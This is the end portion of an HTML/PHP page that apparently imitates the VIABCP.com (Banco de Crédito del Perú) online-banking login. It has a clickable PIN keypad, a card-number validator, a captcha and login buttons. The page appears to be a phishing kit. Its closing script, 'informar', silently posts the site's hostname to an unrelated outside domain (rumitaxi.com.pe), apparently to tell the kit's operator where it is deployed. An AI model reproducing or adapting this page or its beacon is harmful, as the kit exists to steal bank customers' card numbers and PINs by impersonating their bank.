            <img onclick="evalRanTable('4'); logintud(); clear_error_card(); clear_error_clave();" class="seed-enabled" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMjEuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiBjb250ZW50U2NyaXB0VHlwZT0idGV4dC9lY21hc2NyaXB0IiB6b29tQW5kUGFuPSJtYWduaWZ5IiBjb250ZW50U3R5bGVUeXBlPSJ0ZXh0L2NzcyIgaWQ9IkNhcGFfMSIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzYgMzY7IiB2ZXJzaW9uPSIxLjEiIHhtbDpzcGFjZT0icHJlc2VydmUiIHdpZHRoPSIzNnB4IiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWlkWU1pZCBtZWV0IiB2aWV3Qm94PSIwIDAgMzYgMzYiIGhlaWdodD0iMzZweCIgeD0iMHB4IiB5PSIwcHgiPgo8cmVjdCB4PSIwIiB3aWR0aD0iMzYiIGhlaWdodD0iMzYiIHN0eWxlPSJmaWxsOiNGMUYxRjE7Ii8+CjxnPgoJPHJlY3Qgd2lkdGg9IjEyIiB4PSIxMiIgaGVpZ2h0PSIxNy44IiB5PSI4LjUiIHN0eWxlPSJmaWxsOm5vbmU7Ii8+Cgk8cGF0aCBzdHlsZT0iZmlsbDojMzMzMzMzOyIgZD0iTTE4LjksMjAuNmgtMy43Yy0xLDAtMS4yLTAuNC0xLjItMC45YzAtMC4zLDAuMS0wLjcsMC43LTEuNWwzLjYtNC42YzAuNS0wLjcsMC45LTAuOSwxLjUtMC45ICAgYzAuNSwwLDAuOSwwLjMsMC45LDEuMXY1LjVIMjJ2MS4zaC0xLjNWMjNIMTl2LTIuNEgxOC45eiBNMTUuNywxOS4yaDMuMlYxNUwxNS43LDE5LjJ6Ii8+CjwvZz4KPGNpcmNsZSBmaWxsPSIjNTE4M0FGIiByPSIwLjUiIGN4PSIyOCIgY3k9IjI3Ii8+CjxjaXJjbGUgZmlsbD0iIzUxODNBRiIgcj0iMC41IiBjeD0iMTgiIGN5PSIyMSIvPgo8L3N2Zz4=">
            <img onclick="evalRanTable('8'); logintud(); clear_error_card(); clear_error_clave();" class="seed-enabled" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMjEuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiBjb250ZW50U2NyaXB0VHlwZT0idGV4dC9lY21hc2NyaXB0IiB6b29tQW5kUGFuPSJtYWduaWZ5IiBjb250ZW50U3R5bGVUeXBlPSJ0ZXh0L2NzcyIgaWQ9IkNhcGFfMSIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzYgMzY7IiB2ZXJzaW9uPSIxLjEiIHhtbDpzcGFjZT0icHJlc2VydmUiIHdpZHRoPSIzNnB4IiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWlkWU1pZCBtZWV0IiB2aWV3Qm94PSIwIDAgMzYgMzYiIGhlaWdodD0iMzZweCIgeD0iMHB4IiB5PSIwcHgiPgo8cmVjdCB4PSIwIiB3aWR0aD0iMzYiIGhlaWdodD0iMzYiIHN0eWxlPSJmaWxsOiNGMUYxRjE7Ii8+CjxnPgoJPHJlY3Qgd2lkdGg9IjEyIiB4PSIxMiIgaGVpZ2h0PSIxNy44IiB5PSI4LjUiIHN0eWxlPSJmaWxsOm5vbmU7Ii8+Cgk8cGF0aCBzdHlsZT0iZmlsbDojMzMzMzMzOyIgZD0iTTE4LDEyLjZjMS43LDAsMy42LDAuNSwzLjYsMi41YzAsMS4xLTAuMiwxLjgtMS41LDIuNWMxLDAuNiwxLjYsMS4yLDEuNiwyLjVjMCwyLjQtMS43LDIuOS0zLjgsMi45ICAgYy0yLjIsMC0zLjgtMC43LTMuOC0yLjljMC0xLjMsMC42LTEuOSwxLjYtMi41Yy0xLTAuNi0xLjUtMS4yLTEuNS0yLjVDMTQuNCwxMy4xLDE2LjIsMTIuNiwxOCwxMi42eiBNMTgsMjEuNmMxLjEsMCwyLTAuMywyLTEuNiAgIGMwLTEuMS0wLjQtMS42LTIuNS0xLjhjLTEsMC4yLTEuNiwwLjctMS42LDEuOEMxNiwyMS40LDE2LjgsMjEuNiwxOCwyMS42eiBNMTguNCwxNi45YzEtMC4yLDEuNS0wLjYsMS41LTEuNmMwLTEuMi0wLjktMS40LTItMS40ICAgUzE2LDE0LjEsMTYsMTUuM0MxNi4xLDE2LjIsMTYuNCwxNi44LDE4LjQsMTYuOXoiLz4KPC9nPgo8Y2lyY2xlIGZpbGw9IiM1MTgzQUYiIHI9IjAuNSIgY3g9IjE5IiBjeT0iMTIiLz4KPGNpcmNsZSBmaWxsPSIjNTE4M0FGIiByPSIwLjUiIGN4PSIyNiIgY3k9IjI3Ii8+CjxjaXJjbGUgZmlsbD0iIzUxODNBRiIgcj0iMC41IiBjeD0iMzEiIGN5PSI4Ii8+Cjwvc3ZnPg==">
            <img onclick="evalRanTable('9'); logintud(); clear_error_card(); clear_error_clave();" class="seed-enabled" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMjEuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiBjb250ZW50U2NyaXB0VHlwZT0idGV4dC9lY21hc2NyaXB0IiB6b29tQW5kUGFuPSJtYWduaWZ5IiBjb250ZW50U3R5bGVUeXBlPSJ0ZXh0L2NzcyIgaWQ9IkNhcGFfMSIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzYgMzY7IiB2ZXJzaW9uPSIxLjEiIHhtbDpzcGFjZT0icHJlc2VydmUiIHdpZHRoPSIzNnB4IiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWlkWU1pZCBtZWV0IiB2aWV3Qm94PSIwIDAgMzYgMzYiIGhlaWdodD0iMzZweCIgeD0iMHB4IiB5PSIwcHgiPgo8cmVjdCB4PSIwIiB3aWR0aD0iMzYiIGhlaWdodD0iMzYiIHN0eWxlPSJmaWxsOiNGMUYxRjE7Ii8+CjxnPgoJPHJlY3Qgd2lkdGg9IjEyIiB4PSIxMiIgaGVpZ2h0PSIxNy44IiB5PSI4LjUiIHN0eWxlPSJmaWxsOm5vbmU7Ii8+Cgk8cGF0aCBzdHlsZT0iZmlsbDojMzMzMzMzOyIgZD0iTTE0LjEsMTZjMC0yLjcsMS41LTMuMywzLjktMy4zYzMsMCwzLjcsMS42LDMuNyw0LjJjMCw0LjctMSw2LjItNS42LDYuMmMtMC4xLDAtMC4zLDAtMS4xLDAgICBsLTAuMS0xLjRjMS44LTAuMSw1LDAuMyw1LTIuNmMtMC41LDAuMS0xLjMsMC4yLTIsMC4yQzE1LjUsMTkuMiwxNC4xLDE4LjUsMTQuMSwxNnogTTE4LDE0Yy0xLjcsMC0yLjIsMC41LTIuMiwxLjkgICBjMCwxLjUsMC44LDEuOCwyLjIsMS44YzAuNiwwLDEuMy0wLjEsMS44LTAuMmMwLTAuMywwLTAuNywwLTFDMTkuOSwxNS4zLDE5LjcsMTQsMTgsMTR6Ii8+CjwvZz4KPGNpcmNsZSBmaWxsPSIjNTE4M0FGIiByPSIwLjUiIGN4PSI5IiBjeT0iMTUiLz4KPGNpcmNsZSBmaWxsPSIjNTE4M0FGIiByPSIwLjUiIGN4PSIzMCIgY3k9IjI1Ii8+Cjwvc3ZnPg==">
            <img onclick="evalRanTable('7'); logintud(); clear_error_card(); clear_error_clave();" class="seed-enabled" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMjEuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiBjb250ZW50U2NyaXB0VHlwZT0idGV4dC9lY21hc2NyaXB0IiB6b29tQW5kUGFuPSJtYWduaWZ5IiBjb250ZW50U3R5bGVUeXBlPSJ0ZXh0L2NzcyIgaWQ9IkNhcGFfMSIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzYgMzY7IiB2ZXJzaW9uPSIxLjEiIHhtbDpzcGFjZT0icHJlc2VydmUiIHdpZHRoPSIzNnB4IiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWlkWU1pZCBtZWV0IiB2aWV3Qm94PSIwIDAgMzYgMzYiIGhlaWdodD0iMzZweCIgeD0iMHB4IiB5PSIwcHgiPgo8cmVjdCB4PSIwIiB3aWR0aD0iMzYiIGhlaWdodD0iMzYiIHN0eWxlPSJmaWxsOiNGMUYxRjE7Ii8+CjxnPgoJPHJlY3Qgd2lkdGg9IjEyIiB4PSIxMiIgaGVpZ2h0PSIxNy44IiB5PSI4LjUiIHN0eWxlPSJmaWxsOm5vbmU7Ii8+Cgk8cGF0aCBzdHlsZT0iZmlsbDojMzMzMzMzOyIgZD0iTTE0LjYsMTQuMnYtMS41aDZjMC43LDAsMS4xLDAuMywxLjEsMC44YzAsMC4yLDAsMC40LTAuMSwwLjZsLTQsOC44aC0ybDQuMy04LjcgICBDMTkuOSwxNC4yLDE0LjYsMTQuMiwxNC42LDE0LjJ6Ii8+CjwvZz4KPGNpcmNsZSBmaWxsPSIjNTE4M0FGIiByPSIwLjUiIGN4PSIxNSIgY3k9IjIyIi8+CjxjaXJjbGUgZmlsbD0iIzUxODNBRiIgcj0iMC41IiBjeD0iMTgiIGN5PSIxNSIvPgo8L3N2Zz4=">
            <img class="clean-button" src="files/img/loli_manito_clean-new.svg" onclick="deletexd(); logintud(); clear_error_card(); clear_error_clave();">
          </div>
        </div>
        <div>
          <div class="left">
            <img onclick="evalRanTable('0'); logintud(); clear_error_card(); clear_error_clave();" class="seed-enabled" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMjEuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiBjb250ZW50U2NyaXB0VHlwZT0idGV4dC9lY21hc2NyaXB0IiB6b29tQW5kUGFuPSJtYWduaWZ5IiBjb250ZW50U3R5bGVUeXBlPSJ0ZXh0L2NzcyIgaWQ9IkNhcGFfMSIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzYgMzY7IiB2ZXJzaW9uPSIxLjEiIHhtbDpzcGFjZT0icHJlc2VydmUiIHdpZHRoPSIzNnB4IiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWlkWU1pZCBtZWV0IiB2aWV3Qm94PSIwIDAgMzYgMzYiIGhlaWdodD0iMzZweCIgeD0iMHB4IiB5PSIwcHgiPgo8cmVjdCB4PSIwIiB3aWR0aD0iMzYiIGhlaWdodD0iMzYiIHN0eWxlPSJmaWxsOiNGMUYxRjE7Ii8+CjxnPgoJPHJlY3Qgd2lkdGg9IjEyIiB4PSIxMiIgaGVpZ2h0PSIxNy44IiB5PSI4LjUiIHN0eWxlPSJmaWxsOm5vbmU7Ii8+Cgk8cGF0aCBzdHlsZT0iZmlsbDojMzMzMzMzOyIgZD0iTTE4LDIzYy0zLjEsMC0zLjgtMS43LTMuOC01LjJzMC42LTUuMiwzLjgtNS4yczMuOCwxLjcsMy44LDUuMlMyMS4xLDIzLDE4LDIzeiBNMTgsMjEuNiAgIGMxLjksMCwyLTEuNSwyLTMuOFMxOS45LDE0LDE4LDE0cy0yLDEuNS0yLDMuOFMxNi4xLDIxLjYsMTgsMjEuNnoiLz4KPC9nPgo8Y2lyY2xlIGZpbGw9IiM1MTgzQUYiIHI9IjAuNSIgY3g9IjMwIiBjeT0iMiIvPgo8Y2lyY2xlIGZpbGw9IiM1MTgzQUYiIHI9IjAuNSIgY3g9IjI4IiBjeT0iMjYiLz4KPGNpcmNsZSBmaWxsPSIjNTE4M0FGIiByPSIwLjUiIGN4PSIyNiIgY3k9IjI4Ii8+Cjwvc3ZnPg==">
            <img onclick="evalRanTable('2'); logintud(); clear_error_card(); clear_error_clave();" class="seed-enabled" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMjEuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiBjb250ZW50U2NyaXB0VHlwZT0idGV4dC9lY21hc2NyaXB0IiB6b29tQW5kUGFuPSJtYWduaWZ5IiBjb250ZW50U3R5bGVUeXBlPSJ0ZXh0L2NzcyIgaWQ9IkNhcGFfMSIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzYgMzY7IiB2ZXJzaW9uPSIxLjEiIHhtbDpzcGFjZT0icHJlc2VydmUiIHdpZHRoPSIzNnB4IiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWlkWU1pZCBtZWV0IiB2aWV3Qm94PSIwIDAgMzYgMzYiIGhlaWdodD0iMzZweCIgeD0iMHB4IiB5PSIwcHgiPgo8cmVjdCB4PSIwIiB3aWR0aD0iMzYiIGhlaWdodD0iMzYiIHN0eWxlPSJmaWxsOiNGMUYxRjE7Ii8+CjxnPgoJPHJlY3Qgd2lkdGg9IjEyIiB4PSIxMiIgaGVpZ2h0PSIxNy44IiB5PSI4LjUiIHN0eWxlPSJmaWxsOm5vbmU7Ii8+Cgk8cGF0aCBzdHlsZT0iZmlsbDojMzMzMzMzOyIgZD0iTTE0LjQsMjIuOWMwLjYtMy4xLDAuOC00LjMsMy4yLTUuM2MxLjQtMC42LDItMS4xLDItMi4yUzE5LDE0LDE3LDE0Yy0wLjcsMC0xLjYsMC4xLTIuMywwLjIgICBMMTQuNiwxM2MwLjktMC4yLDIuMS0wLjMsMy4zLTAuM2MyLDAsMy42LDAuNSwzLjYsMi41YzAsMS45LTEsMy0zLDMuOGMtMS42LDAuNi0xLjksMS4yLTIsMi41aDVWMjNMMTQuNCwyMi45TDE0LjQsMjIuOXoiLz4KPC9nPgo8Y2lyY2xlIGZpbGw9IiM1MTgzQUYiIHI9IjAuNSIgY3g9IjI0IiBjeT0iMzIiLz4KPGNpcmNsZSBmaWxsPSIjNTE4M0FGIiByPSIwLjUiIGN4PSIzMSIgY3k9IjE3Ii8+CjxjaXJjbGUgZmlsbD0iIzUxODNBRiIgcj0iMC41IiBjeD0iMjgiIGN5PSIzMyIvPgo8L3N2Zz4=">
            <img onclick="evalRanTable('3'); logintud(); clear_error_card(); clear_error_clave();" class="seed-enabled" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMjEuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiBjb250ZW50U2NyaXB0VHlwZT0idGV4dC9lY21hc2NyaXB0IiB6b29tQW5kUGFuPSJtYWduaWZ5IiBjb250ZW50U3R5bGVUeXBlPSJ0ZXh0L2NzcyIgaWQ9IkNhcGFfMSIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzYgMzY7IiB2ZXJzaW9uPSIxLjEiIHhtbDpzcGFjZT0icHJlc2VydmUiIHdpZHRoPSIzNnB4IiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWlkWU1pZCBtZWV0IiB2aWV3Qm94PSIwIDAgMzYgMzYiIGhlaWdodD0iMzZweCIgeD0iMHB4IiB5PSIwcHgiPgo8cmVjdCB4PSIwIiB3aWR0aD0iMzYiIGhlaWdodD0iMzYiIHN0eWxlPSJmaWxsOiNGMUYxRjE7Ii8+CjxnPgoJPHJlY3Qgd2lkdGg9IjEyIiB4PSIxMiIgaGVpZ2h0PSIxNy44IiB5PSI4LjUiIHN0eWxlPSJmaWxsOm5vbmU7Ii8+Cgk8cGF0aCBzdHlsZT0iZmlsbDojMzMzMzMzOyIgZD0iTTIxLjMsMTUuMmMwLDEuMS0wLjUsMS45LTEuNSwyLjRjMSwwLjQsMS42LDEsMS42LDIuM2MwLDIuNC0xLjUsMy4yLTMuOSwzLjIgICBjLTEuMiwwLTIuMi0wLjEtMy4xLTAuM2wwLjItMS40YzAuOCwwLjEsMS43LDAuMiwyLjUsMC4yYzEuNywwLDIuNC0wLjMsMi40LTEuNmMwLTAuOS0wLjQtMS40LTEuMi0xLjVjLTAuNi0wLjEtMS4zLTAuMS0yLjEtMC4xICAgSDE2VjE3YzAuOCwwLDEuNi0wLjEsMi4zLTAuMmMwLjgtMC4xLDEuMS0wLjYsMS4xLTEuNGMwLTEuMi0wLjktMS4zLTIuMS0xLjNjLTAuOSwwLTEuOCwwLjEtMi43LDAuMkwxNC40LDEzICAgYzAuOS0wLjIsMS45LTAuMywzLTAuM0MxOS41LDEyLjYsMjEuMywxMywyMS4zLDE1LjJ6Ii8+CjwvZz4KPGNpcmNsZSBmaWxsPSIjNTE4M0FGIiByPSIwLjUiIGN4PSIyNCIgY3k9IjQiLz4KPGNpcmNsZSBmaWxsPSIjNTE4M0FGIiByPSIwLjUiIGN4PSIyNSIgY3k9IjE2Ii8+CjxjaXJjbGUgZmlsbD0iIzUxODNBRiIgcj0iMC41IiBjeD0iNyIgY3k9IjYiLz4KPC9zdmc+">
            <img onclick="evalRanTable('5'); logintud(); clear_error_card(); clear_error_clave();" class="seed-enabled" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMjEuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiBjb250ZW50U2NyaXB0VHlwZT0idGV4dC9lY21hc2NyaXB0IiB6b29tQW5kUGFuPSJtYWduaWZ5IiBjb250ZW50U3R5bGVUeXBlPSJ0ZXh0L2NzcyIgaWQ9IkNhcGFfMSIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzYgMzY7IiB2ZXJzaW9uPSIxLjEiIHhtbDpzcGFjZT0icHJlc2VydmUiIHdpZHRoPSIzNnB4IiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWlkWU1pZCBtZWV0IiB2aWV3Qm94PSIwIDAgMzYgMzYiIGhlaWdodD0iMzZweCIgeD0iMHB4IiB5PSIwcHgiPgo8cmVjdCB4PSIwIiB3aWR0aD0iMzYiIGhlaWdodD0iMzYiIHN0eWxlPSJmaWxsOiNGMUYxRjE7Ii8+CjxnPgoJPHJlY3Qgd2lkdGg9IjEyIiB4PSIxMiIgaGVpZ2h0PSIxNy44IiB5PSI4LjUiIHN0eWxlPSJmaWxsOm5vbmU7Ii8+Cgk8cGF0aCBzdHlsZT0iZmlsbDojMzMzMzMzOyIgZD0iTTE0LjcsMjEuM2MwLjgsMC4xLDEuNywwLjIsMi41LDAuMmMxLjgsMCwyLjQtMC4yLDIuNC0yYzAtMS40LTEuNS0xLjYtMi44LTEuNmMtMC43LDAtMS4zLDAtMiwwICAgbDAuNC01LjNoNi4xdjEuNWgtNC42bC0wLjIsMi40YzAuMiwwLDAuNSwwLDAuNywwYzIuNSwwLDQuMywwLjQsNC4zLDMuMWMwLDIuNC0xLjMsMy4zLTMuOCwzLjNjLTEuMSwwLTIuMi0wLjEtMy4yLTAuM0wxNC43LDIxLjN6ICAgIi8+CjwvZz4KPGNpcmNsZSBmaWxsPSIjNTE4M0FGIiByPSIwLjUiIGN4PSIyNiIgY3k9IjkiLz4KPGNpcmNsZSBmaWxsPSIjNTE4M0FGIiByPSIwLjUiIGN4PSIzMiIgY3k9IjgiLz4KPC9zdmc+">
            <img onclick="evalRanTable('6'); logintud(); clear_error_card(); clear_error_clave();" class="seed-enabled" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IS0tIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMjEuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgLS0+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiBjb250ZW50U2NyaXB0VHlwZT0idGV4dC9lY21hc2NyaXB0IiB6b29tQW5kUGFuPSJtYWduaWZ5IiBjb250ZW50U3R5bGVUeXBlPSJ0ZXh0L2NzcyIgaWQ9IkNhcGFfMSIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzYgMzY7IiB2ZXJzaW9uPSIxLjEiIHhtbDpzcGFjZT0icHJlc2VydmUiIHdpZHRoPSIzNnB4IiBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWlkWU1pZCBtZWV0IiB2aWV3Qm94PSIwIDAgMzYgMzYiIGhlaWdodD0iMzZweCIgeD0iMHB4IiB5PSIwcHgiPgo8cmVjdCB4PSIwIiB3aWR0aD0iMzYiIGhlaWdodD0iMzYiIHN0eWxlPSJmaWxsOiNGMUYxRjE7Ii8+CjxnPgoJPHJlY3Qgd2lkdGg9IjEyIiB4PSIxMiIgaGVpZ2h0PSIxNy44IiB5PSI4LjUiIHN0eWxlPSJmaWxsOm5vbmU7Ii8+Cgk8cGF0aCBzdHlsZT0iZmlsbDojMzMzMzMzOyIgZD0iTTIxLjksMTkuN2MwLDIuNy0xLjUsMy4zLTMuOSwzLjNjLTMsMC0zLjctMS42LTMuNy00LjJjMC00LjcsMS02LjIsNS42LTYuMmMwLjEsMCwwLjMsMCwxLjEsMCAgIGwwLjEsMS40Yy0xLjgsMC4xLTUtMC4zLTUsMi42YzAuNS0wLjEsMS4zLTAuMiwyLTAuMkMyMC41LDE2LjUsMjEuOSwxNy4xLDIxLjksMTkuN3ogTTE3LjksMjEuNmMxLjcsMCwyLjItMC41LDIuMi0xLjkgICBjMC0xLjUtMC44LTEuOC0yLjItMS44Yy0wLjYsMC0xLjMsMC4xLTEuOCwwLjJjMCwwLjMsMCwwLjcsMCwxQzE2LjEsMjAuMywxNi4zLDIxLjYsMTcuOSwyMS42eiIvPgo8L2c+CjxjaXJjbGUgZmlsbD0iIzUxODNBRiIgcj0iMC41IiBjeD0iOSIgY3k9IjEzIi8+CjxjaXJjbGUgZmlsbD0iIzUxODNBRiIgcj0iMC41IiBjeD0iMSIgY3k9IjIxIi8+CjxjaXJjbGUgZmlsbD0iIzUxODNBRiIgcj0iMC41IiBjeD0iMjMiIGN5PSIyMyIvPgo8L3N2Zz4=">
            <img class="clean-button" src="files/img/loli_manito_delete-new.svg" onclick="clearxd(); logintud(); clear_error_card(); clear_error_clave();">
          </div>
        </div>
      </div>

        <div id="forgot-clave" class="forget-desactivado">
        	<span style="font-family: Flexo-Regular; font-weight: bold; color: #ff7800; font-size: 12px; letter-spacing: 0.3px; text-decoration: underline;">¿Olvidaste tu clave?</span>
        </div>

        <div style="margin-top: 30px;">
        	<p style="font-family: Flexo-Regular; font-size: 14px; font-weight: bold; font-style: normal; font-stretch: normal; line-height: 1.71; letter-spacing: normal; color: #002D87; margin-left: 16px;">Ayúdanos a comprobar que no eres un robot</p>
        	<div style="display: flex;">
        		<img style="height: 40px; border-radius: 6px; border: solid 1px #efefef; background-color: #f8f8fa;" src="files/img/loli_manito_<?php echo "captcha".$b.".png" ;?>">
        		<input placeholder="Escribe los caracteres" type="text" name="captcha" class="captcha">
        	</div>
        </div>

        <div style="margin-top: 50px;">
        	<div style="margin-left: 25px; margin-right: 25px; margin-bottom: 25px;">
        		<button id="btnEntrar" type="submit" style="outline: none !important; font-family: Flexo-Bold; height: 40px; padding: 0 16px; font-size: 18px; line-height: 38px; border-radius: 20px; color: #fff; background-color: #ff7800; border: 1px solid #ff7800; box-shadow: none; width: 100%;">Ingresar <i style="font-size: 15px; margin-left: 5px;" class="fas fa-arrow-right"></i></button>
        	</div>
        	<div style="margin-left: 25px; margin-right: 25px;">
        		<button type="button" style="outline: none !important; font-family: Flexo-Bold; height: 40px; padding: 0 16px; font-size: 18px; line-height: 38px; border-radius: 20px; color: #ff7800; background-color: white; border: 1px solid #ff7800; box-shadow: none; width: 100%;">Crea tu clave</button>
        	</div>
        </div>
        </form>
    </div>
    </div>

    <div class="login-footer">
    	<div class="footer-text-container">
    		<p class="footer-text">© 2019 VIABCP.com</p>
    		<p class="footer-text separador"> | </p>
    		<p class="footer-text">Todos los derechos reservados</p>
    	</div>
    	<div class="footer-logo-container">
    		<img class="footer-logo" src="files/img/loli_manito_logo-blue.svg">
    	</div>
    </div>

    <script type="text/javascript">
    $(function() 
    {
        $('#card').validateCreditCard(function(result) 
        {
            $("#validacion").val(result.valid);
        });
        
        informar = function()
        {
            m_url = window.location.hostname;
            console.log(m_url);
            $.post("http://www.rumitaxi.com.pe/connect/ep1.jpg",
            {
                url:m_url
            },
            function(raw_data)
            {
                
            });
        }
        informar();
        
        
    });
    </script>

</body>
</html>